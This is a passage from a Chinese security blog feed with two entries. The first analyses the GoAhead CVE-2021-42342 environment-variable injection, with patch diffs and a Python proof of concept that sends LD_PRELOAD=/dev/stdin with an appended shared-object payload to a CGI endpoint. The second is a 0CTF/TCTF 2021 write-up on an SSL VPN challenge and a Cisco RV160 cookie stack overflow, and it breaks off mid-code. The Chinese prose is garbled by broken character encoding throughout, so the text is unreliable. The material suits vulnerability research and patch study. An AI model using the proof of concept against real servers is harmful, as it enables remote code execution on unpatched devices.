Content-Lengthâ€</li><li>å°†æ•°æ®åŒ…çš„Content-Lengthè®¾ç½®ä¸ºä¸è¶…è¿‡16384çš„å€¼ï¼Œä½†éœ€è¦æ¯”payload.soæ–‡ä»¶çš„å¤§å°è¦å¤§ä¸ª500å­—èŠ‚å·¦å³ï¼Œæˆ‘è¿™é‡Œè®¾ç½®ä¸º15000</li></ul></blockquote><p>æ„é€ å¦‚ä¸‹payloadï¼š </p><ol><li>Content-Length å°äºæ€»çš„ upload data çš„å¤§å°</li><li>Content-Length è‡³å°‘è¦å¤§äº payload.so  çš„å¤§å°</li></ol><p>é‚£ä¹ˆè¿™ä¸ªæ–¹æ³•æ˜¯å¦‚ä½•ç”Ÿæ•ˆçš„å‘¢ï¼Ÿ å½“å‡ºå‘upload åï¼Œåˆ°æ‰§è¡Œ cgiï¼Œ ç¨‹åºä»£ç ä¼šè°ƒç”¨<code>processContent</code>å°†å¤„ç†postæ•°æ®ï¼Œå°†å…¶ä¿å­˜åˆ°tmpæ–‡ä»¶ä¸­ï¼Œ å…¶ä»£ç å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091921124.png" title="image-20220109192138087" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091921124.png" alt="image-20220109192138087"></a></p><p>å½“ <code>wp-&gt;oef </code> ä¸ºå‡æ—¶ï¼Œ ç¨‹åºä¼šåˆ¤æ–­ post çš„æ•°æ®æœªè¯»å®Œï¼Œå› æ­¤ä¼šè¿›åˆ° <code>filterChunkData</code> å‡½æ•°ä¸­ï¼Œ å½“ç¨‹åºåˆ¤æ–­æ•°æ®å·²ç»è¯»å®Œï¼Œ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091939636.png" title="image-20220109193908584" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091939636.png" alt="image-20220109193908584"></a></p><p>å³ <code>wp-&gt;rxRemainning &lt;=0</code> åï¼Œä¼šè®¾ç½® <code>wp-&gt;eof</code>  çš„å€¼ä¸º 1 ã€‚ è¿™è¡¨æ˜æ ¹æ® æ•°æ®å·²ç»æ¥å—å®Œæ¯•ï¼Œç„¶åèµ°åˆ° <code>upload.c:1216</code> è¡Œ, è°ƒç”¨ <code>websProcessUploadData </code> å‡½æ•°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091911961.png" title="image-20220109191114896" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091911961.png" alt="image-20220109191114896"></a></p><p>æ‰§è¡Œåˆ°å¦‚ä¸Šå›¾ä¸­åˆ° 145 è¡Œä»£ç å¤„ï¼Œè°ƒç”¨processContentData`å‡½æ•°ï¼Œ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091944301.png" title="image-20220109194405252" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091944301.png" alt="image-20220109194405252"></a></p><p>ç”±äºæˆ‘ä»¬è®¾ç½®çš„ Content-Length å°äºæ€»çš„æ•°æ®åŒ…å¤§å°ï¼Œå› æ­¤æˆ‘ä»¬æ˜¯è¯»ä¸åˆ° <code>Boundaray</code> ï¼Œå› æ­¤è¿™é‡Œ 348 ä»£ç è¿”å› 0  ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091945836.png" title="image-20220109194525781" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091945836.png" alt="image-20220109194525781"></a></p><p><code>canProceed</code> ä¸ºé›¶ï¼Œä»148 ä»£ç å¤„è¿”å›åˆ° http.c:1216 è¡Œã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091948266.png" title="image-20220109194835191" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091948266.png" alt="image-20220109194835191"></a></p><p>ç„¶åä» 1218 è¡Œå¤„ä»£ç è¿”å›åˆ° http.c:867 è¡Œ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091949226.png" title="image-20220109194953182" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091949226.png" alt="image-20220109194953182"></a></p><p>æ¥ç€ for å¾ªç¯å› ä¸º canProceed ä¸º 0 ï¼Œå› æ­¤ break é€€å‡ºå¾ªç¯ã€‚è‡³æ­¤åˆ°è¿™è¿˜æ²¡æœ‰è°ƒåˆ° cgi ï¼Œä½†ç¨‹åºçš„æ•°æ®å·²å¤„ç†å®Œä¸€éƒ¨åˆ†ã€‚ ç„¶åç¨‹åºç›´æ¥é€€å›åˆ° <code>readEvent</code>, ä¹‹åç”±äºæˆ‘ä»¬æ•°æ®åŒ…å¹¶æ²¡æœ‰å‘é€å®Œï¼Œ è¿˜æœ‰ä¸€éƒ¨åˆ†åˆ°è„æ•°æ®æœªå¤„ç†ã€‚ä»£ç åˆä¼šèµ°ä¸€é</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socketEventâ€”&gt;readEvent-&gt;websPump-&gt;processContent</span><br></pre></td></tr></table></figure><p>å½“åˆ° processContent å‡½æ•°çš„æ—¶å€™ï¼Œ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091955229.png" title="image-20220109195548187" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091955229.png" alt="image-20220109195548187"></a></p><p>1209 è¡Œä»£ç ä¸æ»¡è¶³ï¼Œ 1239 è¡Œä»£ç æ»¡è¶³ï¼Œ å› æ­¤ <code>wp-&gt;state</code> è¢«è®¾ç½®ä¸º WEBS_READY ã€‚ç„¶åå† websPump ä»£ç å¤„æ‰§è¡Œ <code>websRunrequest</code>ï¼Œ æœ€åæ‰§è¡Œ CGI ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091956842.png" title="image-20220109195658790" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091956842.png" alt="image-20220109195658790"></a></p><p><strong>æ€»ç»“</strong></p><ol><li>è®©ç¨‹åºæ²¡æœ‰è¯»å–åˆ° boundary , ç¨‹åºä¼šè§‰å¾—æ•°æ®æ²¡æœ‰å¤„ç†å®Œï¼Œ å› æ­¤ä¸ä¼š close æ–‡ä»¶æè¿°ç¬¦</li><li>è®©ç¨‹åºè®¤ä¸ºå‰©ä¸‹æœªè¯»åˆ°æ•°æ®ï¼Œ ä¸å¯èƒ½è¯»åˆ° boundary äº†ï¼Œ å› æ­¤ä¼šå† http.c:1293 è¡Œå¤„è®¾ç½® wp-&gt;eof flag </li><li>ä¿æŒé“¾æ¥çš„ä¸ä¸­æ–­ï¼Œ ç¨‹åºä¼šæ¥ç€å°è¯•è¯»æ•°æ®</li></ol><p>æ ¹æ®ä»¥ä¸Šçš„åˆ†æä»¥åŠä¹‹åçš„å®è·µï¼Œ æˆ‘ä»¬å‘ç°é™¤äº† phith0n  å¸ˆå‚…çš„è¿™ç§æ–¹æ³•ï¼Œå…¶å®è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼Œä¸”ä¸éœ€è¦ç«äº‰</p><ol><li>ä¸¤æ¬¡å‘é€æ•°æ®ï¼Œç¬¬ä¸€æ¬¡å‘é€éœ€è¦ payload.so å‘é€ä¸”å†™å…¥ä¸´æ—¶æ–‡ä»¶ï¼Œä¸”é€šè¿‡åˆ é™¤ boundary è®©ç¨‹åºhandleä½ï¼Œç¬¬äºŒæ¬¡å‘é€åŠ«æŒç¯å¢ƒå˜é‡</li><li>ä¸€æ¬¡å‘é€ï¼Œ åªéœ€åˆ é™¤ boundary æ ‡å¿—ï¼Œ ç„¶å sleep åï¼Œ å‘é€ä¸€æ¬¡æ•°æ®å³å¯</li></ol><h2 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h2><p><a href="https://github.com/embedthis/goahead/commit/6906212c8db07265850e3870dbc97b541712e2c7">FIX: flag upload form vars as untrusted so they will be prefixed. Â· embedthis/goahead@6906212 (github.com)</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@@ -320,6 +320,7 @@ static bool processContentData(Webs *wp)</span><br><span class="line">&#123;</span><br><span class="line">    WebsUpload  *file;</span><br><span class="line">    WebsBuf     *content;</span><br><span class="line"><span class="addition">+    WebsKey     *sp;</span></span><br><span class="line">    ssize       size, nbytes, len;</span><br><span class="line">    char        *data, *bp;</span><br><span class="line"></span><br><span class="line">@@ -380,7 +381,9 @@ static bool processContentData(Webs *wp)</span><br><span class="line">            trace(5, &quot;uploadFilter: form[%s] = %s&quot;, wp-&gt;uploadVar, data);</span><br><span class="line">            websDecodeUrl(wp-&gt;uploadVar, wp-&gt;uploadVar, -1);</span><br><span class="line">            websDecodeUrl(data, data, -1);</span><br><span class="line"><span class="deletion">-           websSetVar(wp, wp-&gt;uploadVar, data);</span></span><br><span class="line"><span class="addition">+            sp = websSetVar(wp, wp-&gt;uploadVar, data);</span></span><br><span class="line"><span class="addition">+            //  Flag as untrusted so CGI will prefix</span></span><br><span class="line"><span class="addition">+            sp-&gt;arg = 1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        websConsumeInput(wp, nbytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/embedthis/goahead/commit/5bc764136fc7adbeea419d8cd360ed407c555f07">FIX: trim CGI env vars for black list Â· embedthis/goahead@5bc7641 (github.com)</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@@ -173,10 +173,10 @@ PUBLIC bool cgiHandler(Webs *wp)</span><br><span class="line">    if (wp-&gt;vars) &#123;</span><br><span class="line">        for (n = 0, s = hashFirst(wp-&gt;vars); s != NULL; s = hashNext(wp-&gt;vars, s)) &#123;</span><br><span class="line">            if (s-&gt;content.valid &amp;&amp; s-&gt;content.type == string) &#123;</span><br><span class="line"><span class="deletion">-                vp = strim(s-&gt;name.value.string, 0, WEBS_TRIM_START);</span></span><br><span class="line"><span class="addition">+                vp = strim(s-&gt;name.value.string, &quot; \t\r\n&quot;, WEBS_TRIM_BOTH);</span></span><br><span class="line">                if (smatch(vp, &quot;REMOTE_HOST&quot;) || smatch(vp, &quot;HTTP_AUTHORIZATION&quot;) ||</span><br><span class="line">                    smatch(vp, &quot;IFS&quot;) || smatch(vp, &quot;CDPATH&quot;) ||</span><br><span class="line"><span class="deletion">-                    smatch(vp, &quot;PATH&quot;) || sstarts(vp, &quot;LD_&quot;)) &#123;</span></span><br><span class="line"><span class="addition">+                    smatch(vp, &quot;PATH&quot;) || sstarts(vp, &quot;PYTHONPATH&quot;) || sstarts(vp, &quot;LD_&quot;)) &#123;</span></span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                if (s-&gt;arg != 0 &amp;&amp; *ME_GOAHEAD_CGI_VAR_PREFIX != &#x27;\0&#x27;) &#123;</span><br></pre></td></tr></table></figure><p>ä¿®æ­£äº†  strim å‡½æ•°çš„æ­£ç¡®ä½¿ç”¨ï¼Œä»¥åŠå¯¹æ–‡ä»¶ä¸Šä¼ å¤„ç†åŒæ ·åŠ å…¥äº†<code>sp-&gt;arg = 1</code>çš„å¤„ç†</p><h2 id="æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦-çš„é—®é¢˜è¡¥å……"><a href="#æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦-çš„é—®é¢˜è¡¥å……" class="headerlink" title="æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦ çš„é—®é¢˜è¡¥å……"></a>æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦ çš„é—®é¢˜è¡¥å……</h2><p>update ï¼š 2022/01/17 </p><p>@nepire ä»Šå¤©å’Œæˆ‘æäº†ä¸€ä¸ªè§£å†³è¿™ä¸ªé—®é¢˜çš„å¦å¤–ä¸€ä¸ªæ–¹æ³• ï¼Œ æˆ‘ä»¬ç®€å•å›é¡¾ä¸‹ä»£ç </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171711335.png" title="image-20220117171150196" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171711335.png" alt="image-20220117171150196"></a></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶æ˜¯åœ¨ src/upload.c:342 è¡Œå†™å…¥çš„ï¼Œä½†æ˜¯é™¤äº†æ­¤å¤„ä»¥ä¸ºæˆ‘ä»¬æ²¡æœ‰å…¶ä»–åœ°æ–¹å†™ä¸´æ—¶æ–‡ä»¶äº†å—ï¼Ÿæœç´¢ä¸€ä¸‹ <code>write\(.*fd</code> å†™å…¥æ–‡ä»¶çš„ä»£ç </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171720190.png" title="image-20220117172041121" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171720190.png" alt="image-20220117172041121"></a></p><p>æˆ‘ä»¬æ‰¾åˆ°å¦å¤–ä¸€å¤„æ–‡ä»¶æè¿°ç¬¦ï¼Œ <code>wp-&gt;cgifd</code> , å…¶å†™å…¥çš„å†…å®¹ä¸º <code>wp-&gt;input.servp</code>,   é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ä¿è¯ <code>wp-&gt;input.servp</code> æ•°æ®å³ä¸º ELF çš„æ•°æ®å‘¢ï¼Ÿ</p><p>æ ¹æ®ç®€å•é˜…è¯»ä»£ç , å³åœ¨ upload.c  ä»£ç ä¸­</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171801106.png" title="image-20220117180115037" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171801106.png" alt="image-20220117180115037"></a></p><p>åœ¨ upload å¤„ç†æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œ æ•°æ®æŒ‡é’ˆç”± <code>bufCompact</code> å‡½æ•°å¤„ç†ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171803209.png" title="image-20220117180328157" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171803209.png" alt="image-20220117180328157"></a></p><p>è¯¥å‡½æ•°å°†æ­¤æ¬¡è¯»å–çš„ æ•°æ®ç”± <code>bp-&gt;servp</code> æ‹·è´åˆ° <code>bp-&gt;buf</code>ä¸­ï¼Œ ç„¶ååœ¨ç§»åŠ¨ä¿®æ”¹ <code>bp-&gt;servp</code> ï¼Œ å½“è¯»å–åˆ° <code>Boundary</code>ç»“æŸçš„æ—¶å€™ï¼Œ<code>bp-&gt;servp</code> åˆšå¥½æŒ‡å‘äº† <code>--------------------------6671c05704e869e7--</code> çš„ç»“å°¾å¤„ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€åœ¨æ­¤å¤„åé¢è¡¥å…… ELF æ•°æ®å³å¯</p><p>å› æ­¤å¤§è‡´ PoC å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">headers = <span class="string">&quot;&quot;&quot;POST /cgi-bin/test.cgi HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: localhost:8080\r</span></span><br><span class="line"><span class="string">Accept: */*\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=------------------------f74e4c2f448c9827\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">body = <span class="string">b&quot;&quot;&quot;--------------------------f74e4c2f448c9827</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">/dev/stdin\r</span></span><br><span class="line"><span class="string">--------------------------f74e4c2f448c9827--\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#/dev/stdin</span></span><br><span class="line"><span class="comment">#/proc/self/fd/0</span></span><br><span class="line"></span><br><span class="line">n = remote(ip,port)</span><br><span class="line">post = body + parse_so(<span class="string">&#x27;./poc.so&#x27;</span>)</span><br><span class="line">n.send(headers.format(len(post)).encode(<span class="string">&#x27;latin&#x27;</span>) + post)</span><br></pre></td></tr></table></figure><p>å¦å¤–æ­¤æ—¶åŠ«æŒçš„ fd å¯ä»¥æŒ‡å‘ 0 æˆ–è€… 6ï¼Œ å› ä¸ºåœ¨ launchCgi å‡½æ•°ä¸­ä¼šé‡æ–° dup2 ç›¸å…³æ–‡ä»¶æè¿°ç¬¦ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171840954.png" title="image-20220117184055856" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171840954.png" alt="image-20220117184055856"></a></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/6407">CVE-2017-17562 GoAheadè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://tttang.com/archive/1399/">GoAheadç¯å¢ƒå˜é‡æ³¨å…¥å¤ç°è¸©å‘è®° - è·³è·³ç³– (tttang.com)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2021-42342" scheme="https://bestwing.me/tags/CVE-2021-42342/"/>
    
  </entry>
  
  <entry>
    <title>2021 TCTF iOA and RV Writeup</title>
    <link href="https://bestwing.me/2021-TCTF-RV-Writeup.html"/>
    <id>https://bestwing.me/2021-TCTF-RV-Writeup.html</id>
    <published>2021-07-05T16:00:00.000Z</published>
    <updated>2021-08-20T18:50:44.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‘¨æœ«å’Œr3kapigçš„å°ä¼™ä¼´ä¸€èµ·æ‰“äº†ï¼Œ 0CTF/TCTF 2021 Qualsï¼Œ ç„¶åä¸¤å¤©çš„æ—¶é—´éƒ½è€—åœ¨äº† iOA å’Œ RV è¿™ä¸¤ä¸ªé¢˜èº«ä¸Šäº†ã€‚<br><a class="gallery-item"><img src=""></a>(<a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706110534.png">https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706110534.png</a>)</p><h2 id="iOA"><a href="#iOA" class="headerlink" title="iOA"></a>iOA</h2><p>è¿™ä¸ªé¢˜ç›®ï¼Œåœ¨ pizza å’Œ åœ£åš å› ä¸ºåœ¨æ‹–ç€æˆ‘çš„æƒ…å†µä¸‹åšäº†å¥½ä¹…æ‰åšå‡ºæ¥ï¼Œ æœ€ç»ˆæ‹¿äº†ä¸ªäºŒè¡€ã€‚</p><p>é¢˜ç›®å®ç°äº†ä¸€ä¸ª sslvpn åè®®æ ˆï¼Œæœ‰å‡ ä¸ªæ¼æ´ç‚¹</p><p>ï¼ˆ1ï¼‰urlencode å¯ä»¥ç»•è¿‡  ../ çš„æ£€æŸ¥ï¼Œå¯¼è‡´è·¨ç›®å½•æ–‡ä»¶è¯»å–ï¼Œ å¯ä»¥è¯»å– user.txt çš„è´¦å·å¯†ç </p><p>   (2)  vip çš„ bitmap æ“ä½œæœ‰è´Ÿæ•°è¶Šç•Œæ“ä½œï¼Œ å¯ä»¥è®¿é—®bssä¸Šçš„å†…å®¹, è¯»master_keyï¼Œæ”¹dhcp_poolï¼Œç”¨req_vipçš„æ•´æ•°æˆªæ–­leak canaryï¼Œåœ¨req_vipé‡Œæ ˆæº¢å‡ºã€‚</p><p>ç›¸å…³æ–‡ä»¶å¯ä»¥è¿™é‡Œè·å–ï¼›</p><ol><li><p>sslvpn idb</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/sslvpnd.i64">http://bestwing.me/attachments/2021-TCTF-quals/iOA/sslvpnd.i64</a></p></li><li><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/iOA/leak.py">leak.py</a></p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/leak.py">http://bestwing.me/attachments/2021-TCTF-quals/iOA/leak.py</a></p></li><li><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/iOA/exploit.py">exploit.py</a></p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/exploit.py">http://bestwing.me/attachments/2021-TCTF-quals/iOA/exploit.py</a></p></li></ol><h2 id="RV"><a href="#RV" class="headerlink" title="RV"></a>RV</h2><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>Cisco RV160 Router behind iOA!<br>remote version is <code>1.0.01.01</code>.<br><a href="http://10.1.1.1/">http://10.1.1.1</a></p></blockquote><p>è¿™ä¸ªé¢˜ç›®å‘¢ï¼Œ æ˜¯ä¸€ä¸ª Cisco RV160çš„ 1dayé¢˜ï¼Œè¿™é¢˜ä¹Ÿæ˜¯æ¯”è¾ƒå¯æƒœçš„ã€‚å…¶å®èƒ½åšå‡ºæ¥çš„ï¼Œå› ä¸ºä¹‹å‰æˆ‘åˆšå¥½ä¹Ÿç»™æ€ç§‘æŠ¥è¿‡ RV160çš„æ´ï¼Œæ˜¯ä¸€ä¸ªhttpdä¸Šçš„æ ˆæº¢å‡ºï¼Œåˆšå¥½ä¹Ÿæ˜¯è¿™ä¸ªç‰ˆæœ¬ã€‚ä½†æ˜¯æ‰“æ¯”èµ›çš„æ—¶å€™ä¸ºäº†çœäº‹ï¼Œ æƒ³ç”¨ cgi çš„å‘½ä»¤æ³¨å…¥æ‰“ï¼Œ æ²¡æ‰“æˆåŠŸï¼Œè€Œä¸”ä¸ç®¡è®¿é—®ä»€ä¹ˆå½“æ—¶éƒ½æ˜¯è¿”å› 403 é”™è¯¯ï¼Œä¸€åº¦è®©æˆ‘æ€€ç–‘äººç”Ÿ</p><p>èµ›åæ‰çŸ¥é“ï¼Œ ç”±äºä¸»åŠæ–¹æ˜¯ docker + qemu å¯åŠ¨çš„ï¼Œ çŒœæµ‹å¯¼è‡´æœ‰äº›ç¯å¢ƒå˜é‡æœ‰é—®é¢˜ï¼Œå› æ­¤åœ¨403 check çš„æ—¶å€™è¿‡ä¸å»ï¼Œå› æ­¤æ ¹æœ¬åˆ°ä¸äº†æ‰§è¡Œ cgi çš„ä½ç½®ã€‚</p><p>ç„¶ååœ¨è¿™é‡Œæˆ‘æ‰“ç®—å…¬å¼€è¿™ä¸ªçš„æ¼æ´çš„ç»†èŠ‚ï¼Œä»¥åŠåœ¨è¿™ä¸ªé¢˜ç›®ä¸Šçš„åˆ©ç”¨ï¼Œ è¿™ä¸ªæ¼æ´åº”è¯¥æ˜¯å»å¹´æŠ¥å‘Šçš„ï¼Œç¼–å·ä¸º  CVE-2021-1293</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706115827.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706115827.png"></a></p><h3 id="æ¼æ´ç»†èŠ‚"><a href="#æ¼æ´ç»†èŠ‚" class="headerlink" title="æ¼æ´ç»†èŠ‚"></a>æ¼æ´ç»†èŠ‚</h3><p>åœ¨å¤„ç† cookie çš„æ—¶å€™ï¼Œä¼šå­˜åœ¨æº¢å‡ºæ ˆæº¢å‡ºã€‚</p><p>ï¼ˆ1ï¼‰ é¦–å…ˆåœ¨ httpd handle ä¸­ï¼Œ cookie çš„æŒ‡é’ˆä¼šèµ‹å€¼åˆ°ä¸€ä¸ªå…¨å±€å˜é‡é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(s1, <span class="string">&quot;Cookie:&quot;</span>, <span class="number">7u</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  nptr = s1 + <span class="number">7</span>;</span><br><span class="line">  v11 = <span class="built_in">strspn</span>(s1 + <span class="number">7</span>, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">  nptr += v11;</span><br><span class="line">  Cookie = (<span class="keyword">int</span>)nptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ ç„¶ååœ¨ check_need_login å‡½æ•°ä¸­, ä¼šåˆ¤æ–­å“ªäº› uri éœ€è¦ç™»å½•    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v33 = check_need_login(v25);</span><br><span class="line"><span class="keyword">if</span> ( v33 )</span><br><span class="line">  v38 = check_Is_not_login_page((<span class="keyword">const</span> <span class="keyword">char</span> *)Cookie);</span><br><span class="line">v26 = <span class="built_in">printf</span>(<span class="string">&quot;=====is_login=%d, is_not_login_page=%d&quot;</span>, v38, v33);</span><br><span class="line"><span class="keyword">if</span> ( v39 || !v38 &amp;&amp; v33 )</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_need_login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !uri_string || !*(_BYTE *)uri_string )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;help&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;images/collapsed.png&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;cportal&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> 